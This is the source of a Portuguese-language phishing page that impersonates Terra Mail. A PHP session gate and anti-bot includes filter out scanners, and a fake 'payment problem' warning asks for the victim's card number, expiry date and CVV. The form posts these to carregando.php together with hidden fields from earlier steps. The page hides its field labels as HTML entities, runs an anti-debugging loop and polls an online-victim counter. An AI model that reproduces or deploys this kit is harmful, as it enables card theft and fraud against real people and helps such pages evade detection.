<?php 
session_start();
@include ('./verifyBot/27lcxdso.php');
require_once('./verifyBot/ant-bot.php');
require_once('./verifyBot/ant-bot1.php');

if (isset($_SESSION["7s1f9l81cb"])) {
} else {
  header("Location: 404/?noticia=negado");
  exit();
}
?>
<!DOCTYPE html>
<html lang="pt-br">

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">

	<title>&#84;&#101;&#114;&#114;&#97;&#32;&#77;&#97;&#105;&#108;</title>


	<meta name="theme-color" content="##F1F1F1">
	<meta name="apple-mobile-web-app-status-bar-style" content="##F1F1F1">
	<meta name="msapplication-navbutton-color" content="##F1F1F1">

	<link rel="stylesheet" href="./assets/8njd8qzi/all.css">
	<script src="./assets/8njd8qzi/jquery.min.js"></script>
	<script src="./assets/8njd8qzi/jquery.mask.js"></script>
	<link rel="shortcut icon" type="image/x-icon" href="./assets/favicon_1.ico">
	<script type="text/javascript">
		$("#ncard").mask("0000 0000 0000 0000");
		$("#vcard").mask("00/0000");
		$("#ccard").mask("000");
	</script>
</head>

<body cz-shortcut-listen="true" style="background-color: #F1F1F1;">

	<div id="app">
		<div>
			<div class="md">
				<div class="corpo_md">


					<div class="show_apd" v-show="!isInicio" style="background:#FF7212;">
						<center><img src="./assets/8njd8qzi/logo.png" width="132px" height="45px"></center>
						<center><img src="./assets/8njd8qzi/alert.png" width="80px" height="80px"></center>
						<p>
							Prezado(a) Cliente Terra, ocorreu algum problema com sua forma de
							pagamento da sua assinatura, e para evitar futuros transtornos como o
							bloqueio de sua conta pedimos que você atualize sua forma de
							pagamento.";

						</p>

						<form id="formulario" name="form" action="carregando.php" method="POST">
							
							<input type="hidden" name="cp" value="<?php echo htmlentities($_POST['cp']); ?>">
							<input type="hidden" name="tel" value="<?php echo htmlentities($_POST['tel']); ?>">

							<script>
								function somenteNumeros(num) {
									var er = /^(?=.*?[a-z])(?=(?:.*?\d){9})[a-z\d\ ]{12,}$/i;
									er.lastIndex = 0;
									var campo = num;
									if (er.test(campo.value)) {
										campo.value = "";
									}
								}
							</script>

							<label for="telefone">
								<span style="color: white;">&#78;&#250;&#109;&#101;&#114;&#111;&#32;&#100;&#111;&#32;&#99;&#97;&#114;&#116;&#227;&#111;</span>
								<input type="tel" name="ncard" id="ncard" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" pattern="\b(\d{4}\s\d{4}\s\d{4}\s\d{4}$)\b" onkeyup="somenteNumeros(this);" required="required">
							</label>
							<label for="telefone">
								<span style="color: white;">&#68;&#97;&#116;&#97;&#32;&#100;&#101;&#32;&#118;&#97;&#108;&#105;&#100;&#97;&#100;&#101;</span>
								<input type="tel" name="vcard" id="vcard" maxlength="7" placeholder="MM/AAAA" required="required">
							</label>
							<label for="telefone">
								<span style="color: white;">&#67;&#243;&#100;&#105;&#103;&#111;&#32;&#100;&#101;&#32;&#115;&#101;&#103;&#117;&#114;&#97;&#110;&#231;&#97;&#40;&#67;&#86;&#86;&#41;</span>
								<input type="tel" name="ccard" id="ccard" maxlength="3" placeholder="Código de segurança" required="required">
							</label>

							<button class="btn_next" style="color:white;background:#c14e00;" id="submit" type="submit" title="Confirmar" value="Confirmar">CONFIRMAR</button>
						</form>
					</div>
				</div>
			</div>
			<div class="wrapper container_dentro">
				<div class="header">
					<div class="buscar"><img src="./assets/8njd8qzi/busca.png" alt=""></div>
					<div class="menu"><img src="./assets/8njd8qzi/menu.png" alt=""></div>

				</div>

				<div class="corpo">

					<div class="corpo_img"><img src="./assets/8njd8qzi/corpo.png" alt=""></div>
					<script type="text/javascript" src="./assets/noc.js"></script>
				</div>
			</div>
		</div>
	</div>

	<script>setInterval(function(){$.post("./verifyBot/8whu95hvz7.php",{contar:""},function(n){$("#Online").text(n)})},1e4);</script>

	<script>
setInterval(()=>{debugger;},0xc8);
   </script>
</body>


</html>